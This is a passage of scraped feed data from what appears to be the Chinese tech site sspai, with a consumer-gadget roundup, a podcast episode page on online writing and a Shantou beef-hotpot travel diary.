不仅看上去金属风，拿在手里也有着金属独有的冰冷和沉重感，先不谈听感如何，反正拿着是挺带劲。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/4a2d042901760e0abb9240fe5f3bf75d\"></figure><p>当然，CARGO 2 外形虽然独特，却不是只有外表好看，其基础配置——譬如蓝牙 5.1、IPX5 防水、动圈单元、单边控制等——也都是当前 TWS 耳机的主流标配。不仅如此，CARGO 2 的耳机本体与外壳传递的厚重感大相径庭，轻盈且舒适，并未因为主打设计而忽略了一款耳机的核心功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/51cd593978e635a26a3680d5b7ac658f.jpeg\"></figure><p>要说唯一遗憾之处，那就是 CARGO 2 没有主动降噪系统。虽然其因为人体工学设计得合理，佩戴时很紧致所以物理隔音效果挺好，但没有主动降噪决定了这款耳机注定无法在户外，特别是地铁等交通工具上使用，未免与其「时尚单品，随时带出街」的气质相悖。</p>\n<p>说到「时尚单品」，CARGO 2 还额外送了一套贴纸，可以贴在外壳上，增加一些个性化创意元素。另外，由于 CARGO 2 的外壳是全金属的，长久使用后涂层有可能脱落，露出金属本色，有点意思。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/c52e18bd78645c4c8ffcdfff0903c66a.png\"><figcaption>秀贴纸，顺便剧透一款新的定制周边</figcaption></figure><p>这款耳机在电商平台的价格基本都三百块起步，由于我派几名工友尝试之后都觉得不错，于是问路大手一挥跟代理商搞到了货源，并给出了 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=650639199693\" target=\"_blank\">299 元的全网最低价</a>。想弄个好看又好用的 TWS 耳机的朋友可以重点考虑考虑它。</p>\n<h2>@Lotta：欧缇丽 <strong>CAUDALIE </strong>皇后水</h2>\n<ul>\n<li>入手渠道：淘宝旗舰店</li>\n<li>参考价格：380 元</li>\n</ul>\n<p>用过一次之后就变成我的夏日清凉必备了。这款葡萄精华喷雾主打控油醒肤，也可用于定妆，据说还有收敛毛孔和轻微抗氧化的功效。最喜欢它里面的薄荷精油成分，肉眼可见静置时飘在最上面金黄色的一层。使用前大力摇一摇，把精油摇匀，喷出来的水雾细密、镇静清凉，尤其是晒后使用，镇静效果明显。如果使用前不摇匀的话，不仅控油效果会打折，用到后期也有可能堵塞喷头，这大概就是有人感觉后期喷头会变不好用的原因。注意使用时最好避免喷到眼周，否则会睁不开眼睛，满含泪水（参考清凉油）。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/08/7d481eab995433f7bf5f937c633514c5.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/08/814f7255ef7721b7827a7cdd07704890.png\" alt=\"\"></figure><p>我购入的是 100ml 款，有时候还会有 30ml 款的赠品，比较适合出门携带，午间休息喷一喷，醒神效果显著。目前有绿色和粉色两款，除了包装之外，没有其他不同。可以趁旗舰店搞活动的时候入手，买一送一。但它成分表里写着含乙醇，我用起来虽然没有任何不适感，但干皮和敏感肌的友友们还是要谨慎购买。</p>\n<h2>@北落师门捷列夫：Sony Xperia 1 III</h2>\n<p>这个标题写起来都很有神圣感。</p>\n<ul>\n<li>购买渠道：京东索尼自营店</li>\n<li>入手价格：8299（预售定金 100 膨胀至 300；另白条 24 期免息——四舍五入不要钱）</li>\n</ul>\n<p>在 2018 年入手 iPhone X 以前，我买过的手机就只有两部索爱翻盖、两部索尼智能机，当然这些年的索尼发布会也都有关注。这次下定决心充值信仰，主要原因是对现阶段的 iPhone 倍感失望，想要在一段时间里只用安卓设备，手上的某国产品牌手机各方面都不错，但拍照实在拿不上台面，作为一个曾经的摄影爱好者，免不得被这次 1 III 在影像方面的宣传洗了脑，虽然 8499 的价格确实让人犹豫再三，但是，经过我的一番分析：</p>\n<blockquote><p>8499 = 手机本体 3000+ 影像系统 3000+logo3000-系统拉胯倒贴用户 500-交个朋友退 1 块</p></blockquote>\n<p>还是很合理的嘛！于是下定金，补尾款……6 月 2 号，618 第二天收到了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/03/e5606e347f92d9ed467d7d72dbc8aa3e.jpg\"></figure><p>稍微使用下来，优点大家可以去看各大评测博主，基本上都说得差不多了，而且你看完一遍很可能也会种草。我这里就简单说两句我自己比较在意的优点：</p>\n<ul>\n<li>我的是暮笙紫，智能手机外观的天花板。手感好到爆，摸一下都能高潮。不服可以去线下店摸摸看。</li>\n<li>预装了不少腾讯系软件，但是都可以卸载，甚至包括预装的应用市场腾讯应用宝和预装浏览器！当然了卸载之前记得先装好替代品……</li>\n<li>预装了那啥框架，直接那啥就可以了，无缝的。而且国行特供的节电优能 app 非常好用，系统级夹断。顺便多说一句，节电优能是黑名单制度，默认你可以不管，只针对个别讨厌的流氓 app 进行夹断；不像我之前的某国产品牌手机的手机管家 app，是白名单制度，最多只允许 5 个 app 不受控制，对于 12g 的内存来说有点太浪费了，而且某些新闻的推送总是不能及时收到。总之我觉得现阶段索尼手机买国行是最合算的，既有保修还有节电优能又不妨碍其他功能的使用。</li>\n<li>熟悉的呼吸灯。好多年没用上了……</li>\n<li>再重复一遍我对这块无刘海无打孔 21:9 的 4k 屏幕的喜爱！</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/03/1bd47ec46d33a7e76f81742f65a61eb7.jpg\"><figcaption>指纹电源二合一，实体相机键！半按对焦，全按拍照！</figcaption></figure><p>好了然后就要说一下缺点了：</p>\n<ul>\n<li>贵。不不，这是我的缺点。</li>\n<li>骁龙 888 确实发热严重。随便看了一会视频就很热了，玩大型游戏还不得烫手？后来发现刷一会微博都会很热，这个确实有点说不过去了。</li>\n<li>续航确实不行。待机 10 小时，中途只刷了一次微博，其余时间全在待机，耗电 50% 以上。不清楚能不能支撑完整一天，反正这个续航能力感觉裸机出门有点冒险。</li>\n<li>播放哎呦疼视频无法开到最高效果（4k+hdr10+ 杜比），只能 1080p+hdr，而在我 1080p 屏幕的国产手机上就可以 4k+hdr10，在 iPad Air 第三代上则可以 4k+hdr10+ 杜比全开。据 @酱紫表 大佬指点，应该是哎呦疼和国产厂商有合作，而对于不认识的设备它们就默认给到 1080p。不知道以前的 1 II 在这方面是什么情况？希望后期能适配上，否则这块无刘海无打孔 21:9 的 4k 屏幕就有点浪费了。<a href=\"https://sspai.com/post/66001\">（当然，这里没必要讨论哎呦疼的视频是不是真 4k+hdr10+ 杜比，在同一个视频网站 /app 下，4k 效果必然要胜过 1080p。）</a>\n</li>\n</ul>\n<p>我派貌似只支持网络视频，我就不贴视频了。更多使用体验还得在日后的使用当中慢慢体验，大家请期待尼克老师的深度评测文章。</p>\n<p>最后再次夸一下，这个紫色太漂亮了！索尼大法好！</p>\n<h2>@掘墓人：海备思铝合金手机支架  </h2>\n<ul>\n<li>渠道：天猫官方旗舰店自购</li>\n<li>价格：44 元</li>\n</ul>\n<p>说起手机支架，塑料的、木质的都在用，但是还是想添个铝合金的，毕竟铝合金支架兼具了塑料支架的可调节和木质支架的稳定性，并且颜值也高。</p>\n<p>之前在微博看到一位数码博主发过一款手机支架，当时没有记下名字，还专门搜了一番，最后找到了，就是「海备思」的这款支架。</p>\n<p>拿到手的第一感觉没有想象中那么「沉」，可能是自己预期太高了，毕竟铝合金密度还是比较小的。但是，得益于铝合金材质 + 底部硅胶 + 合理设计，放上手机之后的感觉就一个字：「稳」。正常操控手机不会出现支架或手机晃动的情况，实际上即使大力点也基本不会晃动。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/b6e898462202609434fadf88e5162d95\" alt=\" 海备思手机支架 \"></figure><p>支架的面板，凹槽和底部都有防滑硅胶保护，凹槽处还预留了充电孔位。我习惯把手机靠近凹槽的边缘，这样便于操作手机底部导航栏；但是充电的时候就要把手机放在凹槽的中间，这样手机充电口与充电孔位才能对齐。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/80860f2efacdf973b53f05694db02f12\" alt=\" 放置角度 \"></figure><p>支架的转轴阻尼感也很强，强到什么程度呢，得使劲才能转动。超稳定的转轴让我完全不用担心其承重能力，因为平板借出去了，我就试了下装满水的保温杯（至少一斤），放上去稳得很。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/48e0a1fd35d353bd60ead261946020e8\" alt=\" 放水杯 \"></figure><p>铝合金的材质就确实很有质感，我买的是银白色的，到货之后才发现跟我电脑（深灰色）不是很搭，所以就给女朋友用了，我重新下了一单深灰色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/95122d1157d9a427c7d730f1d84ed41a\" alt=\" 支架和电脑 \"></figure><p>不过还是要吐槽一下，快递包装用的是塑料袋，在运输过程中里面的盒子都裂开了，封口的胶布也没起到什么作用。</p>\n<p>另外，从支架的正前方看，横向的边缘都是有打磨的，摸起来也不觉得割手；但是其他边缘就比较割手，而且容易「刮花」。不过也不是什么太大的问题，毕竟绝大部分时间注意力是在手机上，而不是在支架上。</p>\n<h2>@JLDUAN：AUKEY 傲基 10000mAh Basic Mini 和 MOMAX 摩米士 C2L 小白 PD 数据线 0.3m</h2>\n<ul>\n<li>入手渠道：京东</li>\n<li>入手价格一：¥57（618 价格 ¥89，另叠加优惠券 &amp; 红包）</li>\n<li>入手价格二：¥30（618 价格 ¥49，另叠加优惠券 &amp; 红包）</li>\n</ul>\n<p>多年以来 iPhone 凭借迷你的电池容量、「五福一安」，以及被官方称为「超速了」的 20W 「快充」，致使 iPhone 用户成为共享充电宝的忠实客户。我只有一个 20000 mAh 的充电宝，平常外出逛街、吃饭直接放在挎包里，配上一根 1m 长的 C2L 充电线，续航焦虑倒是缓解了。只是这 20000 mAh 的充电宝真的太重，搁在挎包里太沉。1m 长的线在外边使用也不方便，手机塞在挎包里充电，线要绕好几圈。吃饭时手机放桌子上充电，又害怕线太长沾到油污，还怕被来回经过的人挂到。于是我开始在电商平台物色迷你充电宝和充电宝专用的短线。</p>\n<p>这次趁着 618 活动优惠，仅仅用了不到 100 块钱的成本，就实现了 iPhone 用户可用的外出随身快充套装。迷你充电宝搭配短线，两者都是主打轻巧便捷，非常适合在短途、临时外出的情况下使用。</p>\n<p>在各大充电宝品牌店铺浏览了一圈，发现很多品牌居然没有做迷你充电宝这个类型的产品，或者是产品线许久不更新，性能落后，仅支持 10W 甚至是 5W 的充电功率。好在 iPhone 的「快充」功率低🤨技术难度也不大，近几年充电宝行业推出的新产品几乎都支持。经过一番寻找，综合外观设计和价格，最终选择了 AUKEY 的这款产品。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/06/5f4b725a002d19301fbf845b9a43b62c.jpg\"><figcaption>表面是轻微的磨砂触感</figcaption></figure><p>产品设计相当简约，本体大概和一张银行卡差不多大小。正面只有四个电量指示灯和一个按键，以及一个不太明显的 logo。侧面接缝处有一些缝隙，整体做工还算过得去吧。额定容量为 5800mAh，差不多够 iPhone 11 充满两次。左侧的 USB A 接口最高支持 QC 3.0 18W 输出，右侧 USB C 接口最高支持 PD 18W 输入 / 输出，完美满足 iPhone 11 的「快充」需求。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/06/02a0737bbb19dcb457587c49caf16ae7.jpg\"><figcaption>最大 18W 的输出功率，注定了它只能和 iPhone 相亲相爱……</figcaption></figure><p>平常逛电商 App 时总能刷到充电宝短线的推荐，但是真正到了要买的时候，才发现大部分都是没听过的品牌，破解线泛滥，A2L 的接口也不能满足 PD 快充要求，能选的产品所剩无几。</p>\n<p>一些经过 MFi 认证的 C2L 短线，价格甚至都达到了 1m、2m C2L 长线的水平，看来目前 C2L 充电宝短线的市场需求并不大，价格才能如此坚挺。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/06/2f04a34eeb01edc9eb041eb568ee6dd2.JPG\"></figure><p>对比了几个产品，只有 MOMAX 这款短线在价格上符合我的心理预期，0.3m 的长度真的是刚刚好，充电时无论是塞挎包里还是桌上，都不会显得累赘。并且它还是一款经过 MFi 认证的产品，未来升级系统也不用担心无法使用。</p>\n<h2>@Tecal：NexTool 开箱刀</h2>\n<p>我是一名航模爱好者，出门爽飞需要各种工具，刀肯定是必备的。偶然的机会看到了这款 NexTool 开箱刀，商品描述里：内勾式刀刃设计，表面带有特氟龙涂层，应对胶带给刀具带来的残胶。这些宣传正好符合我的痛点，所以我毫不犹豫就直接下单了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/article/dc41165dd50def65235d9916d2f878d6\"></figure><p>作为一把开箱刀，它的内勾刀刃设计比较有趣，一定程度上提高了安全性，对快递物品和使用者的安全都更加友好。刃口的锋利程度足以应对各种快递，胶带封装的纸箱、塑料外包装、泡泡纸都能轻松解决，终于让我告别了用钥匙指甲开快递的窘境了。</p>\n<p>它的重量很轻，只有不到 13g，在这个重量下也没有舍弃安全背锁，保障了使用时的稳定性。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/article/c917256c32edccd9cb6ee2eb23d83ccb\"></figure><p>宣传的特氟龙涂层确实有效果，会减少一些残胶，少量的残胶也容易清洁。</p>\n<p>但是涂层的寿命堪忧，像我这样在钥匙串上挂着，与钥匙磕碰了一周，已经有了几个磕碰痕迹，长期使用可能难以令人满意：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/article/c247467366b1f6c7b9aec862e95b98eb\"></figure><p>这款开箱刀完全可以胜任多功能刀具的任务，最令我喜欢的就是内勾式设计带来的无刀尖，让使用时不用担心刀尖扎伤。但 30 元的价格买一把小刀，在我这里还是花钱买喜欢的趁手工具，而承受了一定的溢价。</p>\n<p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用 500-1000 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺 </a>🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67612"},{"title":"一派·再读 05：互联网时代的创作","date":"2021-07-08 07:30:00","description":"\n<blockquote><p>这是最好的时代，这是最坏的时代。</p></blockquote>\n<p>狄更斯在小说《双城记》中，这句用来描述 18 世纪末法国社会的话，却让 21 世纪的创作者们深有同感。</p>\n<p>互联网的普及，让信息实现去中心化，每个人都有渠道将自己所写的内容，以最快的方式传递出去。因此，「写作」的权力被真正地授予了每个人；然而，互联网带来的注意力经济逻辑，让「流量为王」成为时代格言，每一个创作者都身处其中，被冲击到无法站立。</p>\n<p>第五期再读播客，我们请到《<a href=\"https://sspai.com/post/66099\">互联网时代的创作</a>》 一文的作者，来自 <a class=\"ss-atUser\" data-mention=\"@沙丘研究所\" user-id=\"bs2pfitb34tcs0polq3g\" href=\"https://sspai.com/u/dunesworkshop\">@沙丘研究所</a> 的陈飞樾 ，以及 <a class=\"ss-atUser\" data-mention=\"@重新想象Lab\" user-id=\"bue120lb34tbf8fs2gp0\" href=\"https://sspai.com/u/9gowv081\">@重新想象Lab</a> （微信公众号：rei-lab）专栏主理人 Shooca，和我们一起聊聊互联网时代的创作。</p>\n<p>「再读」是由少数派数字工具组出品的「读书会式」播客，以少数派发布的文章为线索，以播客的形式对文章中所讨论的话题和内容，进行延展和反思，以拓宽文章所涉及的范围。</p>\n<p>如果您喜爱再读播客，并希望它持续更新，请在各平台留下您的评论，以表达对我们的支持。您的支持将是我们继续制作的重要动力。</p>\n<h2>🎧 直接收听</h2>\n<div class=\"ss-audioSource\" src=\"https://v.typlog.com/reread/8374336312_237421.mp3\" title=\"互联网时代的创作\" cover=\"https://cdn.sspai.com/2021/07/07/fe004448674fcfbacfb30c53e670a0e3.jpg\" artist=\"再读\" chapter='[{\"name\":\"创作者与读者如何产生共鸣？\",\"time\":164},{\"name\":\"文章的解释权属于作者还是读者？\",\"time\":619},{\"name\":\"数据在如何影响着创作者？\",\"time\":1428},{\"name\":\"创造者该如何如互联网时代相处？\",\"time\":2130}]'>Audio</div>\n<h2>🔗 参考链接</h2>\n<ul>\n<li>沙丘研究所的文章《<a href=\"https://sspai.com/post/66099\">互联网时代的创作</a>》；</li>\n<li>重新想象 Lab 的文章《<a href=\"https://sspai.com/post/66293\">我记故我在：数据化时代的自我管理</a>》</li>\n</ul>\n<h2>📻 订阅节目</h2>\n<ul>\n<li><a href=\"https://reread.typlog.io/episodes/feed.xml\">RSS 地址</a></li>\n<li><a href=\"https://podcasts.apple.com/cn/podcast/id1510716121\">Apple 播客</a></li>\n<li><a href=\"https://overcast.fm/p2808382-pFuDUs\">Overcast</a></li>\n<li><a href=\"https://castro.fm/podcast/ff7094e9-6a4f-406e-bfb2-7ad141595cac\">Castro</a></li>\n<li><a href=\"https://pca.st/podcast/7be00be0-5ec9-0139-33e4-0acc26574db2\">Pocket Casts</a></li>\n<li><a href=\"https://open.spotify.com/show/6JCKn9NzBH1N19CpNLMgUz\">Spotify</a></li>\n<li><a href=\"https://www.xiaoyuzhoufm.com/podcast/60405cf8efb6db2a3facf71a\">小宇宙</a></li>\n</ul>\n<p>致谢：本集片头音乐来自 <a class=\"ss-atUser\" data-mention=\"@Tp\" user-id=\"bs2p2ctb34tch279eqrg\" href=\"https://sspai.com/u/tpamazing\">@Tp</a> </p>\n<p>背景音乐：First Love</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67598"},{"title":"快乐飞旅行报告 08：汕头的牛肉能尝出甜味","date":"2021-07-08 06:31:43","description":"\n<p>在 2020 年底，南航推出了快乐飞 2.0，我终于下定决心开启周末全国飞的计划。上半年假期多，南航快乐飞不局限在周末，买它准没错。万万没想到的是疫情再次来袭，一直拖到了今年 3 月底，我才正式出行，好歹也算抓住了快乐飞的下半程。</p>\n<p>本篇是我的快乐飞旅行游记的第八篇，我会以一个系列的形式向大家分享我这三个月的快乐飞旅行见闻，希望大家喜欢。（到最后，如果南航继续推出快乐飞 3.0，我再来做个快乐飞购买总结。）</p>\n<hr>\n<p>到了夏季，雷雨较多，长三角与珠三角迎来了频繁的航班延误情况。这一次汕头之旅的启程之行，与郑州行一样，都是出发延误。到凌晨两点才抵达揭阳潮汕机场，不过令我意外的是，从机场前往汕头的大巴还在运行，这是机场快线汕头线，另外还有潮州线、汕尾线等等。潮汕没有地铁，接驳机场与城市的公共交通只有这机场线。听工作人员说，只要当天的航班没有结束，机场线就会加班运营，十分良心。</p>\n<p>潮汕，出了名的是牛肉火锅、海鲜砂锅、鹅肉饭等，以潮州和汕头两地为旅游胜地。这一次的两日行，时间不算宽裕，因此只去了靠海的汕头。这是和同事一行三人的牛肉火锅之旅，时间是 5 月 21 日 - 5 月 23 日。</p>\n<h2>GoTo Coffee</h2>\n<p>周六清早下了一场阵雨，过后天气闷热异常，早上 10 点无法在街道上行走。同事要到中午才到汕头，先去咖啡店乘凉吧。</p>\n<p>汕头的店有个特点，营业时间不一，即使是同品类的店，也是如此。有些八点即营业了，有些得到十点，还有的是下午一点。出发前一定要看好时间，不然很容易扑空。选择 GoTo Coffee 就是因为另一家店竟然要到中午才营业。</p>\n<p>GoTo Coffee，装修简单，像是日式小店。特色旋蒸奶拿铁，牛奶用的是自行加工的浓缩奶。旋蒸奶，用一个玻璃球泡浸没在 30℃ 的温水里，装入牛奶后不停旋转，将牛奶中的水分蒸发掉 50% 左右，得到口感醇厚的浓缩奶，比冰博克咸味更低。</p>\n<p>店里没有冰杯，旋蒸奶不做 Dirty 似乎有点可惜，咖啡豆自行烘焙，混合了云南的豆子，酸度明亮，加上旋蒸奶甜，也有双重风味。只不过多了一道旋转蒸发手续，价格竟然高出70%。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/6cc2a0089f031f13ea597f21cf0bfaac.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/0dcfc02c2cd0c22960b60f39a20e1e6f.jpg\" alt=\"\"></figure><h2>本地人推荐：阿猴牛肉火锅</h2>\n<p>五月底的汕头，晴朗高温。尽管起了阵阵的夏日暖风，但仍扛不住闷热。不像江浙梅雨季的那种阴雨高温黏腻，但走在烈日下也难以坚持，在阴凉处倒能忍受片刻。</p>\n<p>为了迎接 2021 年亚青会，汕头正在进行大规模的城市道路改造，我们乘坐的出租车在老旧正翻新的道路上穿梭。随口向出租车司机打听当地人爱吃的牛肉火锅，没想到有意外收获。出租车司机推荐的，不是杏花、也不是八合里，反倒是他昨夜刚刚吃过的阿猴。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/2c2738d0a19fcd0031f31892d9026f3c.jpg\"></figure><p>阿猴牛肉丸店，正是这位司机师傅隔三差五就要光临的「本地人之选」。阿猴，开在三让路的老巷里。时间到了正午时分，烈日直射老巷，街上远近无人，居民游客都躲在空调房里。</p>\n<p>阿猴的业务是贩卖牛肉、牛肉丸以及供应牛肉火锅。牛肉火锅没有菜单，想吃什么告诉店家，或者由店家全部安排。老客自然能点出匙仁、吊龙伴之类的心头好，但初来乍到的我们不识牛肉部位，索性叫店家安排。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/99cd579a686258a98b1a175676c63806.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/3177727753dae9c3af64d5c796067eca.jpg\" alt=\"\"></figure><p> </p>\n<p>牛肉火锅，由萝卜、玉米、芹菜煮汤底，尝一小口几乎没味。店家配的牛肉里，一碟牛舌和吊龙伴，另一碟匙仁和肥牛。另加牛肉丸和毛肚，后来又加上了胸口油。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/ac7964ee0c873addb71bef116661bb5e.jpg\"></figure><p>先下匙仁，口感鲜嫩香甜，令我印象深刻，这是我第一次品尝到牛肉的甜味。只有新鲜的牛肉、高品质的部位，才会有这样的风味。匙仁是牛肩胛骨上托着的一块嫩肉的中心部位，脂肪较少。细细的筋带微量脂肪穿插在肉质中，可以说是嫩中之嫩。</p>\n<p>同事说牛肉下锅后得要左手持汤勺，右手用筷子搅动生肉，使其受热均匀。匙仁八秒即成，快速吃完。沙茶酱配牛肉是地道吃法，不过沙茶酱本身味甜，会把牛肉的甜美给掩盖住，蘸一点点为妙。阿猴还提供辣椒酱，这是四川辣椒，咸香重口，其味极辣。再一碟醋，总共三样调味，酸甜辣齐了。后来店家又拿了本地辣椒酱，类似于沙县的辣椒沙酱，辣味寥寥，不推荐。</p>\n<p>吊龙是牛脊背上的一条肉，吊龙伴顾名思义就是吊龙下面的一小部分肉，因为带了一部分肥肉，口感香滑可口，肥瘦比例大概 1:2，肉香更浓，细嚼无渣。肥牛，是牛腹部夹层肉，平时会经常吃到，带了厚脂肪，入口肥香。牛肉丸则一般了，没有内馅。可能是因为目前冷链发达，哪儿都能吃到正宗新鲜的牛肉丸，所以没有留下深刻印象。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/726c787a5678ec8639740e89a723801d.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/9722028f56a6caad8c56f2917864e089.jpg\" alt=\"\"></figure><p>吃完店家配的牛肉，我们还想再点半盘匙仁，结果竟然卖完了，只能在店家推荐下选了胸口油。胸口油，是牛前胸的脂肪，但又不是肥肉。煮了之后竟是脆脆的，不过阿猴家切的太厚，可能当地人喜欢厚切，在我尝来感觉在咬筋，油脂在咬合时从肉质中溢出，顺滑异常，但是油渣难以下咽。</p>\n<p>有种说法，吃牛肉火锅得中午吃最好，因为早上刚宰的牛，到了中午还保持鲜嫩，到了晚上品质就差得多了。我们也特地问了阿猴的老板娘，原来阿猴一天进两次肉，6:30 一次，15:30 一次，因此不管中午还是晚上都能保证食材新鲜。</p>\n<h2>亚地方特色饮品：亚强果汁冰</h2>\n<p>汕头的滴滴车，冷气开得都很弱，无力萎靡，像这座城市一样没有什么活力。吃完牛肉火锅需要冰饮界解解暑。就像海南的清补凉一样，汕头也有特色饮品，那就是果汁冰，其实就是果汁冰沙。</p>\n<p>亚强果汁冰，是推荐榜的第一名。我们来到的是中山路店，排队很久，等待也很久。不过好在点单区旁边是室内就餐区，空调开得十足，可以就座等待。</p>\n<p>果汁冰，可以自选水果，足足有二三十种水果可以自行搭配。平常水果如梨、桃、苹果，特别的有火龙果、奇异果、莲雾等等。原以为这是普通的果汁冰沙，结果出乎意料，这是我喝过口感最细的冰沙，沙质犹如绿豆沙。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/0a1ea664b7b98d79869eebca0627f7bc.jpg\"></figure><p>作为对比，亚强果汁冰用料和口感都属上乘。在酒店附近也品尝过果汁冰，一样好喝，不过水多、水果少，喝起来就像冰果汁，远不如亚强的果汁冰沙。</p>\n<h2>第一次见砂锅拿铁：NorthBridge</h2>\n<p>冲着砂锅拿铁的新鲜劲，我们直奔 NorthBridge 咖啡店。这是一家开在街角的小店，装修成日式风格。店内开阔敞亮，在这儿打字、闲聊、消磨时间都可。</p>\n<p>砂锅拿铁，用的正是中药砂锅作为拿铁容器，因此一份容量要比平时的拿铁杯大上许多。至于味道嘛，只能说是一般水平，图个新鲜。店外木栏椅、户外躺椅，侧边打造成日本车站模样，都很出片。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/afe5e9826952fe1dabc38ff7af00a69d.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/93d27eaf65a44f5274e32097f10b8b56.jpg\" alt=\"\"></figure><h2>进错了门：海关关史陈列馆</h2>\n<p>在咖啡店待到下午三点半，气温依然挺高，但阳光终于缓和些了，我们前往小公园。</p>\n<p>本是先奔着开埠文化陈列馆去，结果后来发现进错了门，走到了海关关史陈列馆。这儿 16 点停止入场，此时即将关门。不过身穿海关制服的馆长一听我们是杭州来的，非常热情地接待，似乎这儿的规定是 16 点就不接待参观了。</p>\n<p>进门便是学生志愿者们对我们深深鞠躬，阵势不小。这些志愿者是来自汕头本地的学生，看似初中生，有个小姑娘说起是被语文老师要求来这儿做志愿者，一脸无奈的神情。等我们发现走错了馆，匆匆看两眼便准备离开。临走时有个小姑娘特别激动，似乎在心里酝酿了很久，终于向我们问起杭州的名人。看着她满脸向往的神情，我竟然一时语塞答不上来。旅行就是从自己待腻的地方到人家待腻的地方去，所言不虚。</p>\n<h2>小公园</h2>\n<p>小公园，是围绕小公园亭往入海口扇形延伸的一块商业和文化区，这里是汕头的老城区，有许多民国建筑群。建筑以骑楼为主，街道宽阔，放射状不断延伸，这儿还是中国大陆面积最大的一片骑楼群。</p>\n<p>汕头旅社，因在临街铺面招牌上含有「汕頭」两字，成为游客打卡点。可附近街道大多店铺都大门紧闭，街上门可罗雀，因几年前开发不算成功，这儿的商业配套远不如其他地方。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/14df118b88e3d7a7b1a3afd50a0fcdf7.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/36b1cfbd5c911aad4c92c041330939c9.jpg\" alt=\"\"></figure><p>一直到小公园亭，才有奶茶、吃食、旅游纪念品等商业服务。不过同样为迎接亚青会，这儿也在进行一些改造。适逢周六，小公园亭内竟摆进许多音响，似乎晚间还有商业活动，所以此时不能拍出干净的照片，甚为可惜。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/fd3f17ba72f359d66e9139eb98da790e.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/8ffc77540f02ff2d8bba1ae2a041029f.jpg\" alt=\"\"></figure><h2>入海口的日落风景： 西堤公园</h2>\n<p>过了小公园亭，前往西堤公园等待落日。汕头，由一条入海海峡分为南北两部，目前由汕头海湾大桥和𬒈(què)石大桥连通南北两岸。</p>\n<p>西堤公园即为北岸入海口的一处观光公园。公园面积不大，但因朝向西南，因此最适合看海边落日风光，沿着海岸线往南便是𬒈石大桥，往西是汕头西部陆地。在西堤公园废弃的码头上，刻着里程碑石。这里距新加坡 1560 海里、距缅甸仰光 2682 海里，往日繁华的码头风光只留下这一处印迹。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/b50dfe9ba451526e9f234fe9863d472d.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/07/723a0c12cd4703ba4c3ca85f46da2fc0.jpg\" 